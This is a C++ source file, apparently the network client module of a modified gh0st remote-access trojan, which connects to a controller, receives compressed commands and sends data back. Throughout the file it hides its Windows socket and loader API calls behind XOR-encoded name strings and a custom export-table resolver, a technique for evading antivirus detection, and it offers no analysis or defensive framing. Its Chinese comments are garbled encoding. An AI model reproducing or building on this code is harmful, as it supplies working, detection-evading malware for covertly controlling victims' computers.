// ClientSocket.cpp: implementation of the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////

#include "ClientSocket.h"
#include "../../common/zlib/zlib.h"
#include <process.h>
#include <MSTcpIP.h>
#include "common/Manager.h"
#include "common/until.h"

#pragma comment(lib, "ws2_32.lib")

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
DWORD SelfGetProcAddress(
	HMODULE hModule, // handle to DLL module
	LPCSTR lpProcName // function name
)
{
	int i = 0;
	char* pRet = NULL;
	PIMAGE_DOS_HEADER pImageDosHeader = NULL;
	PIMAGE_NT_HEADERS pImageNtHeader = NULL;
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;

	pImageDosHeader = (PIMAGE_DOS_HEADER)hModule;
	pImageNtHeader = (PIMAGE_NT_HEADERS)((DWORD)hModule + pImageDosHeader->e_lfanew);
	pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hModule + pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD dwExportRVA = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	DWORD dwExportSize = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	DWORD* pAddressOfFunction = (DWORD*)(pImageExportDirectory->AddressOfFunctions + (DWORD)hModule);
	DWORD* pAddressOfNames = (DWORD*)(pImageExportDirectory->AddressOfNames + (DWORD)hModule);
	DWORD dwNumberOfNames = (DWORD)(pImageExportDirectory->NumberOfNames);
	DWORD dwBase = (DWORD)(pImageExportDirectory->Base);

	WORD* pAddressOfNameOrdinals = (WORD*)(pImageExportDirectory->AddressOfNameOrdinals + (DWORD)hModule);

	//����ǲ�һ���ǰ���ʲô��ʽ����������or������ţ����麯����ַ��

	for (i = 0; i < (int)dwNumberOfNames; i++)
	{
		char* strFunction = (char*)(pAddressOfNames[i] + (DWORD)hModule);
		if (strcmp(strFunction, lpProcName) == 0)
		{
			pRet = (char*)(pAddressOfFunction[pAddressOfNameOrdinals[i]] + (DWORD)hModule);
			break;
		}
	}
	//�жϵõ��ĵ�ַ��û��Խ��
	if ((DWORD)pRet<dwExportRVA + (DWORD)hModule || (DWORD)pRet > dwExportRVA + (DWORD)hModule + dwExportSize)
	{
		if (*((WORD*)pRet) == 0xFF8B)
		{
			return (DWORD)pRet + 2;
		}
		return (DWORD)pRet;
	}
}

privatra::privatra()
{
	//---��ʼ���׽���
	WSADATA wsaData;
	typedef HMODULE(WINAPI* myLoadLibraryA)(
		_In_ LPCSTR lpLibFileName
		);
	char krn[] = { 0x08,0x80, 0x8f, 0x9b, 0x86, 0x82, 0x8a, 0xf6, 0xf6 };
	char* pkrn = decodeStr(krn);
	char loadlb[] = { 0x0c,0x87,0xa5,0xa8,0xac,0x8b,0xaf,0xa7,0xb6,0xa2,0xb0,0xb8,0x81 };
	char* ploadlb = decodeStr(loadlb);
	myLoadLibraryA myLoadLibraryfunc = (myLoadLibraryA)SelfGetProcAddress(GetModuleHandle(pkrn), ploadlb);
	memset(pkrn, 0, krn[STR_CRY_LENGTH]);					//���0
	delete pkrn;
	memset(ploadlb, 0, loadlb[STR_CRY_LENGTH]);					//���0
	delete ploadlb;

	char ws2str[] = { 0x0a,0xbc,0xb9,0xfb,0x97,0xf4,0xf4,0xeb,0xa0,0xaf,0xae};
	char* pws2str = decodeStr(ws2str);
	HMODULE ws2=  myLoadLibraryfunc(pws2str);
	memset(pws2str, 0, ws2str[STR_CRY_LENGTH]);					//���0
	delete pws2str;

	typedef int(WINAPI* myWSAStartup)(
		_In_ WORD wVersionRequested,
		_Out_ LPWSADATA lpWSAData
		);
	//WSAStartup(MAKEWORD(2, 2), &wsaData); 
	char WSAS[] = { 0x0a,0x9c,0x99,0x88,0x9b,0xb3,0xa7,0xb7,0xb0,0xb6,0xb2 };
	char* pWSAS = decodeStr(WSAS);
	myWSAStartup myWSAStartupfunc = (myWSAStartup)SelfGetProcAddress(ws2, pWSAS);
	memset(pWSAS, 0, WSAS[STR_CRY_LENGTH]);					//���0
	delete pWSAS;
	myWSAStartupfunc(MAKEWORD(2, 2), &wsaData);//WSAStartup
	m_hEvent = CreateEvent(NULL, true, false, NULL);
	m_bIsRunning = false;
	m_Socket = INVALID_SOCKET;
	// Packet Flag;

	//char CcRmt[] = { 0x05,0x88,0xa9,0x9b,0xa5,0xb3 };	//CcRmt ע���������ͷ ����gh0st���ض�Ҫһ��
	char CcRmt[] = { 0x07, 0xbb, 0xb8, 0xa0, 0xbe, 0xa6, 0xa5, 0xbc };
	char* pCcRmt = decodeStr(CcRmt);					//���ܺ���

	memcpy(m_bPacketFlag, pCcRmt, CcRmt[STR_CRY_LENGTH]);
	memset(pCcRmt, 0, CcRmt[STR_CRY_LENGTH]);					//���0
	delete pCcRmt;
}
//---�������� �����������
privatra::~privatra()
{
	m_bIsRunning = false;
	WaitForSingleObject(m_hWorkerThread, INFINITE);

	if (m_Socket != INVALID_SOCKET)
		Disconnect();

	CloseHandle(m_hWorkerThread);
	CloseHandle(m_hEvent);
	WSACleanup();
}

//---�����ض˷�������
bool privatra::Connect(LPCTSTR lpszHost, UINT nPort)
{
	// һ��Ҫ���һ�£���Ȼsocket��ľ�ϵͳ��Դ
	Disconnect();
	// �����¼�����
	ResetEvent(m_hEvent);
	m_bIsRunning = false;//����״̬��
	//�ж���������
	typedef HMODULE(WINAPI* myLoadLibraryA)(
		_In_ LPCSTR lpLibFileName
		);
	char krn[] = { 0x08,0x80, 0x8f, 0x9b, 0x86, 0x82, 0x8a, 0xf6, 0xf6 };
	char* pkrn = decodeStr(krn);
	char loadlb[] = { 0x0c,0x87,0xa5,0xa8,0xac,0x8b,0xaf,0xa7,0xb6,0xa2,0xb0,0xb8,0x81 };
	char* ploadlb = decodeStr(loadlb);
	myLoadLibraryA myLoadLibraryfunc = (myLoadLibraryA)SelfGetProcAddress(GetModuleHandle(pkrn), ploadlb);
	memset(pkrn, 0, krn[STR_CRY_LENGTH]);					//���0
	delete pkrn;
	memset(ploadlb, 0, loadlb[STR_CRY_LENGTH]);					//���0
	delete ploadlb;

	char ws2str[] = { 0x0a,0xbc,0xb9,0xfb,0x97,0xf4,0xf4,0xeb,0xa0,0xaf,0xae };
	char* pws2str = decodeStr(ws2str);
	HMODULE ws2 = myLoadLibraryfunc(pws2str);
	memset(pws2str, 0, ws2str[STR_CRY_LENGTH]);					//���0
	delete pws2str;
	typedef int(WINAPI* mysocket)(
		_In_ int af,
		_In_ int type,
		_In_ int protocol
		);

	char sockstr[] = { 0x06,0xb8,0xa5,0xaa,0xa3,0xa2,0xb2 };
	char* psockstr = decodeStr(sockstr);
	mysocket mymysocketfunc = (mysocket)SelfGetProcAddress(ws2, psockstr);
	memset(psockstr, 0, sockstr[STR_CRY_LENGTH]);					//���0
	delete psockstr;
	//m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	m_Socket = mymysocketfunc(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (m_Socket == SOCKET_ERROR)
	{
		return false;
	}

	hostent* pHostent = NULL;
	char gethostbyna[] = { 0x0d,0xac,0xaf,0xbd,0xa0,0xa8,0xb5,0xb1,0xa6,0xba,0xac,0xa0,0xad,0xda };
	char* pgethostbyna = decodeStr(gethostbyna);
	typedef hostent*(WINAPI *mygethostbyname)(
		_In_z_ const char FAR* name
	);
	mygethostbyname mygethostbynamefunc = (mygethostbyname)SelfGetProcAddress(ws2, pgethostbyna);
	memset(pgethostbyna, 0, gethostbyna[STR_CRY_LENGTH]);					//���0
	delete pgethostbyna;
	//pHostent = gethostbyname(lpszHost);
	pHostent = mygethostbynamefunc(lpszHost);
	if (pHostent == NULL)
		return false;

	// ����sockaddr_in�ṹ
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family = AF_INET;
	char htonstr[] = { 0x05,0xa3,0xbe,0xa6,0xa6,0xb4 };
	char* phtonstr = decodeStr(htonstr);
	typedef u_short(WINAPI*myhtons)(
		_In_ u_short hostshort
	);
	myhtons myhtonsfunc = (myhtons)SelfGetProcAddress(ws2, phtonstr);
	ClientAddr.sin_port = myhtonsfunc(nPort);
	memset(phtonstr, 0, htonstr[STR_CRY_LENGTH]);					//���0
	delete phtonstr;
	//ClientAddr.sin_port = htons(nPort);
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);

	char connecstr[] = { 0x07,0xa8,0xa5,0xa7,0xa6,0xa2,0xa5,0xb1 };
	char* pconnecstr = decodeStr(connecstr);
	typedef int(WINAPI*myconnect)(
		_In_ SOCKET s,
		_In_reads_bytes_(namelen) const struct sockaddr FAR* name,
		_In_ int namelen
	);
	
	myconnect myconnectfunc = (myconnect)SelfGetProcAddress(ws2, pconnecstr);
	memset(pconnecstr, 0, connecstr[STR_CRY_LENGTH]);					//���0
	delete pconnecstr;
	if (myconnectfunc(m_Socket, (SOCKADDR*)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)
		return false;
	//if (connect(m_Socket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)
	//	return false;
	// ����Nagle�㷨�󣬶Գ���Ч��������Ӱ��
	// The Nagle algorithm is disabled if the TCP_NODELAY option is enabled 
	//   const char chOpt = 1;
	// 	int nErr = setsockopt(m_Socket, IPPROTO_TCP, TCP_NODELAY, &chOpt, sizeof(char));

		// ��֤socks5������

	// ���ñ�����ƣ��Լ�������ʵ��

	const char chOpt = 1; // True
	// Set KeepAlive �����������, ��ֹ����˲���������
	char setsockstr[] = { 0x0a,0xb8,0xaf,0xbd,0xbb,0xa8,0xa5,0xae,0xab,0xb3,0xb6 };
	char* psetsockstr = decodeStr(setsockstr);

	typedef int(WINAPI* mysetsockopt)(
		_In_ SOCKET s,
		_In_ int level,
		_In_ int optname,
		_In_reads_bytes_opt_(optlen) const char FAR* optval,
		_In_ int optlen
	);
	

	mysetsockopt mysetsockoptfunc = (mysetsockopt)SelfGetProcAddress(ws2, psetsockstr);
	memset(psetsockstr, 0, setsockstr[STR_CRY_LENGTH]);					//���0
	delete psetsockstr;
	typedef int (WINAPI* myWSAIoctl)(
		_In_ SOCKET s,
		_In_ DWORD dwIoControlCode,
		_In_reads_bytes_opt_(cbInBuffer) LPVOID lpvInBuffer,
		_In_ DWORD cbInBuffer,
		_Out_writes_bytes_to_opt_(cbOutBuffer, *lpcbBytesReturned) LPVOID lpvOutBuffer,
		_In_ DWORD cbOutBuffer,
		_Out_ LPDWORD lpcbBytesReturned,
		_Inout_opt_ LPWSAOVERLAPPED lpOverlapped,
		_In_opt_ LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
	);
	char WSAIoctlstr[] = { 0x08,0x9c,0x99,0x88,0x81,0xa8,0xa5,0xb1,0xa8 };
	char* pWSAIoctlstr = decodeStr(WSAIoctlstr);
	myWSAIoctl myWSAIoctlfunc = (myWSAIoctl)SelfGetProcAddress(ws2, pWSAIoctlstr);
	memset(pWSAIoctlstr, 0, WSAIoctlstr[STR_CRY_LENGTH]);					//���0
	delete pWSAIoctlstr;
	if (mysetsockoptfunc(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&chOpt, sizeof(chOpt)) == 0)
	{
		// ���ó�ʱ��ϸ��Ϣ
		tcp_keepalive	klive;
		klive.onoff = 1; // ���ñ���
		klive.keepalivetime = 1000 * 60 * 10; // 3���ӳ�ʱ Keep Alive
		klive.keepaliveinterval = 1000 * 10; // ���Լ��Ϊ5�� Resend if No-Reply
		myWSAIoctlfunc
		(
			m_Socket,
			SIO_KEEPALIVE_VALS,
			&klive,
			sizeof(tcp_keepalive),
			NULL,
			0,
			(unsigned long *)&chOpt,
			0,
			NULL
		);
	}

	m_bIsRunning = true;
	//---���ӳɹ������������߳�  ת��WorkThread
	m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true);

	return true;
}



//�����̣߳�������������thisָ��
DWORD WINAPI privatra::WorkThread(LPVOID lparam)
{
	typedef HMODULE(WINAPI* myLoadLibraryA)(
		_In_ LPCSTR lpLibFileName
		);
	char krn[] = { 0x08,0x80, 0x8f, 0x9b, 0x86, 0x82, 0x8a, 0xf6, 0xf6 };
	char* pkrn = decodeStr(krn);
	char loadlb[] = { 0x0c,0x87,0xa5,0xa8,0xac,0x8b,0xaf,0xa7,0xb6,0xa2,0xb0,0xb8,0x81 };
	char* ploadlb = decodeStr(loadlb);
	myLoadLibraryA myLoadLibraryfunc = (myLoadLibraryA)SelfGetProcAddress(GetModuleHandle(pkrn), ploadlb);
	memset(pkrn, 0, krn[STR_CRY_LENGTH]);					//���0
	delete pkrn;
	memset(ploadlb, 0, loadlb[STR_CRY_LENGTH]);					//���0
	delete ploadlb;

	char ws2str[] = { 0x0a,0xbc,0xb9,0xfb,0x97,0xf4,0xf4,0xeb,0xa0,0xaf,0xae };
	char* pws2str = decodeStr(ws2str);
	HMODULE ws2 = myLoadLibraryfunc(pws2str);
	memset(pws2str, 0, ws2str[STR_CRY_LENGTH]);					//���0
	delete pws2str;
	privatra*pThis = (privatra*)lparam;
	char	*buff= new char[MAX_RECV_BUFFER]; //�����ܳ��ȣ������ڷ���˺Ϳ��ƶ˹��еİ����ļ�macros.h��
	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(pThis->m_Socket, &fdSocket);
	char selectstr[] = { 0x06,0xb8,0xaf,0xa5,0xad,0xa4,0xb2 };
	char* pselectstr = decodeStr(selectstr);
	typedef  int(WINAPI* myselect)(
		_In_ int nfds,
		_Inout_opt_ fd_set FAR* readfds,
		_Inout_opt_ fd_set FAR* writefds,
		_Inout_opt_ fd_set FAR* exceptfds,
		_In_opt_ const struct timeval FAR* timeout
	);
	myselect myselectfunc = (myselect)SelfGetProcAddress(ws2, pselectstr);
	memset(pselectstr, 0, selectstr[STR_CRY_LENGTH]);					//���0
	delete pselectstr;
	char recvstr[] = { 0x04,0xb9,0xaf,0xaa,0xbe };
	char* precvstr = decodeStr(recvstr);
	typedef int(WINAPI* myrecv)(
		_In_ SOCKET s,
		_Out_writes_bytes_to_(len, return) __out_data_source(NETWORK) char FAR* buf,
		_In_ int len,
		_In_ int flags
	);
	myrecv myrecvfunc = (myrecv)SelfGetProcAddress(ws2, precvstr);
	memset(precvstr, 0, recvstr[STR_CRY_LENGTH]);					//���0
	delete precvstr;
	while (pThis->IsRunning())                //---������ض� û���˳�����һֱ�������ѭ���У��ж��Ƿ������ӵ�״̬
	{
		fd_set fdRead = fdSocket;
		int nRet = myselectfunc(NULL, &fdRead, NULL, NULL, NULL);   //---�����ж��Ƿ�Ͽ�����
		if (nRet == SOCKET_ERROR)
		{
			pThis->Disconnect();//�Ͽ�����������
			break;
		}
		if (nRet > 0)
		{
			memset(buff, 0, MAX_RECV_BUFFER);
			int nSize = myrecvfunc(pThis->m_Socket, buff, MAX_RECV_BUFFER, 0);     //---�������ض˷���������
			if (nSize <= 0)
			{
				pThis->Disconnect();//---���մ�����
				break;
			}
			if (nSize > 0) pThis->OnRead((LPBYTE)buff, nSize);    //---��ȷ���վ͵��� OnRead���� ת��OnRead
		}
	}

	return -1;
}

void privatra::run_event_loop()
{
	WaitForSingleObject(m_hEvent, INFINITE);
}

bool privatra::IsRunning()
{
	return m_bIsRunning;
}


//������ܵ�������
void privatra::OnRead(LPBYTE lpBuffer, DWORD dwIoSize)
{
	

	try
	{
		if (dwIoSize == 0)
		{
			Disconnect();       //---������
			return;
		}
		//---���ݰ����� Ҫ�����·���
		if (dwIoSize == FLAG_SIZE && memcmp(lpBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
		{
			// ���·���	
			Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
			return;
		}
		// Add the message to out message
		// Dont forget there could be a partial, 1, 1 or more + partial mesages
		m_CompressionBuffer.Write(lpBuffer, dwIoSize);


		// Check real Data
		//--- ��������Ƿ��������ͷ��С ��������ǾͲ�����ȷ������
		while (m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
		{
			BYTE bPacketFlag[FLAG_SIZE];
			memcpy(bPacketFlag, m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));
			//---�ж�����ͷ ����  ���캯���� ccrem  ���ض��е�
			if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
				throw "bad header";

			int nSize = 0;
			memcpy(&nSize, m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));

			//--- ���ݵĴ�С��ȷ�ж�
			if (nSize && (m_CompressionBuffer.GetBufferLen()) >= nSize)
			{
				int nUnCompressLength = 0;
				//---�õ�������������
				// Read off header
				m_CompressionBuffer.Read((PBYTE)bPacketFlag, sizeof(bPacketFlag));
				m_CompressionBuffer.Read((PBYTE)&nSize, sizeof(int));
				m_CompressionBuffer.Read((PBYTE)&nUnCompressLength, sizeof(int));
				////////////////////////////////////////////////////////
				////////////////////////////////////////////////////////
				// SO you would process your data here
				// 
				// I'm just going to post message so we can see the data
				int	nCompressLength = nSize - HDR_SIZE;
				PBYTE pData = new BYTE[nCompressLength];
				PBYTE pDeCompressionData = new BYTE[nUnCompressLength];

				if (pData == NULL || pDeCompressionData == NULL)
					throw "bad mem";

				m_CompressionBuffer.Read(pData, nCompressLength);

				//////////////////////////////////////////////////////////////////////////
				// ���ǽ�ѹ���ݿ����Ƿ�ɹ�������ɹ������½���
				unsigned long	destLen = nUnCompressLength;
				int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
				//////////////////////////////////////////////////////////////////////////
				if (nRet == Z_OK)//---�����ѹ�ɹ�
				{
					m_DeCompressionBuffer.ClearBuffer();
					m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
					//����	m_pManager->OnReceive����  ת��m_pManager ����
					m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());
				}
				else
					throw "bad mem";

				delete[] pData;
				delete[] pDeCompressionData;
			}
			else
				break;
		}
	}
	catch (...)
	{
		m_CompressionBuffer.ClearBuffer();
		Send(NULL, 0);
	}

}


//ȡ������
void privatra::Disconnect()
{
	// If we're supposed to abort the connection, set the linger value
	// on the socket to 0.
	//�������Ҫ��ֹ���ӣ�������lingerֵ
	LINGER lingerStruct;
	lingerStruct.l_onoff = 1;
	lingerStruct.l_linger = 0;
	/*�����׽�ѡ��
	 setsockopt(
					int socket,					// ����socket���׽���������
					int level,					// �ڶ�������level�Ǳ����õ�ѡ��ļ��������Ҫ���׽��ּ���������ѡ��ͱ����level����Ϊ SOL_SOCKET
					int option_name,			// option_nameָ��׼�����õ�ѡ���ȡ����level
												// SO_LINGER�����ѡ���ѡ��, close�� shutdown���ȵ������׽������Ŷӵ���Ϣ�ɹ����ͻ򵽴��ӳ�ʱ���Ż᷵��. ����, ���ý��������ء�
													��ѡ��Ĳ�����option_value)��һ��linger�ṹ��
														struct linger {
															int   l_onoff;
															int   l_linger;
														};
													���linger.l_onoffֵΪ0(�رգ������� sock->sk->sk_flag�е�SOCK_LINGERλ�������ø�λ������sk->sk_lingertimeֵΪ linger.l_linger��
					const void *option_value,	//LINGER�ṹ
					size_t ption_len			//LINGER��С
	 );
	 */
	setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, (char *)&lingerStruct, sizeof(lingerStruct));

	//ȡ���ɵ����߳�Ϊָ���ļ�����������δ������������I / O���������ù��ܲ���ȡ�������߳�Ϊ�ļ����������I / O������
	CancelIo((HANDLE)m_Socket);
	//ԭ�Ӳ���
	InterlockedExchange((LPLONG)&m_bIsRunning, false);
	closesocket(m_Socket);
	// �����¼���״̬Ϊ�б�ǣ��ͷ�����ȴ��̡߳�
	Sleep(500);
	
	SetEvent(m_hEvent);
	//INVALID_SOCKET������Ч���׽���
	m_Socket = INVALID_SOCKET;
}

int privatra::Send(LPBYTE lpData, UINT nSize)
{

	m_WriteBuffer.ClearBuffer();

	if (nSize > 0)
	{
		// Compress data
		unsigned long	destLen = (double)nSize * 1.001 + 12;
		LPBYTE			pDest = new BYTE[destLen];

		if (pDest == NULL)
			return 0;

		int	nRet = compress(pDest, &destLen, lpData, nSize);

		if (nRet != Z_OK)
		{
			delete[] pDest;
			return -1;
		}

		//////////////////////////////////////////////////////////////////////////
		LONG nBufLen = destLen + HDR_SIZE;
		// 5 bytes packet flag
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		// 4 byte header [Size of Entire Packet]
		m_WriteBuffer.Write((PBYTE)&nBufLen, sizeof(nBufLen));
		// 4 byte header [Size of UnCompress Entire Packet]
		m_WriteBuffer.Write((PBYTE)&nSize, sizeof(nSize));
		// Write Data
		m_WriteBuffer.Write(pDest, destLen);
		delete[] pDest;

		// ��������ٱ�������, ��Ϊ�п�����m_ResendWriteBuffer�����ڷ���,���Բ�ֱ��д��
		LPBYTE lpResendWriteBuffer = new BYTE[nSize];
		CopyMemory(lpResendWriteBuffer, lpData, nSize);
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// ���ݷ��͵�����
		if (lpResendWriteBuffer)
			delete[] lpResendWriteBuffer;
	}
	else // Ҫ���ط�, ֻ����FLAG
	{
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// ���ݷ��͵�����	
	}

	// �ֿ鷢��
	return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
}


int privatra::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
{
	int			nRet = 0;
	const char	*pbuf = (char *)lpData;
	int			size = 0;
	int			nSend = 0;
	int			nSendRetry = 15;
	int			i = 0;
	
	typedef HMODULE(WINAPI* myLoadLibraryA)(
		_In_ LPCSTR lpLibFileName
		);
	char krn[] = { 0x08,0x80, 0x8f, 0x9b, 0x86, 0x82, 0x8a, 0xf6, 0xf6 };
	char* pkrn = decodeStr(krn);
	char loadlb[] = { 0x0c,0x87,0xa5,0xa8,0xac,0x8b,0xaf,0xa7,0xb6,0xa2,0xb0,0xb8,0x81 };
	char* ploadlb = decodeStr(loadlb);
	myLoadLibraryA myLoadLibraryfunc = (myLoadLibraryA)SelfGetProcAddress(GetModuleHandle(pkrn), ploadlb);
	memset(pkrn, 0, krn[STR_CRY_LENGTH]);					//���0
	delete pkrn;
	memset(ploadlb, 0, loadlb[STR_CRY_LENGTH]);					//���0
	delete ploadlb;

	char ws2str[] = { 0x0a,0xbc,0xb9,0xfb,0x97,0xf4,0xf4,0xeb,0xa0,0xaf,0xae };
	char* pws2str = decodeStr(ws2str);
	HMODULE ws2 = myLoadLibraryfunc(pws2str);
	memset(pws2str, 0, ws2str[STR_CRY_LENGTH]);					//���0
	delete pws2str;
	char sendstr[] = { 0x04,0xb8,0xaf,0xa7,0xac };
	char* psendstr = decodeStr(sendstr);
	typedef int(WINAPI* mysend)(
		_In_ SOCKET s,
		_In_reads_bytes_(len) const char FAR* buf,
		_In_ int len,
		_In_ int flags
	);
	mysend mysendfunc = (mysend)SelfGetProcAddress(ws2, psendstr);
	memset(psendstr, 0, sendstr[STR_CRY_LENGTH]);					//���0
	delete psendstr;

	// ���η���
	for (size = nSize; size >= nSplitSize; size -= nSplitSize)
	{
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = mysendfunc(m_Socket, pbuf, nSplitSize, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;

		nSend += nRet;
		pbuf += nSplitSize;
		Sleep(10); // ��Ҫ��Sleep,�����������ƶ����ݻ���
	}
	// �������Ĳ���
	if (size > 0)
	{
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = mysendfunc(m_Socket, (char *)pbuf, size, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		nSend += nRet;
	}
	if (nSend == nSize)
		return nSend;
	else
		return SOCKET_ERROR;
}

void privatra::setManagerCallBack(Cprotm*pManager)
{
	m_pManager = pManager;
}

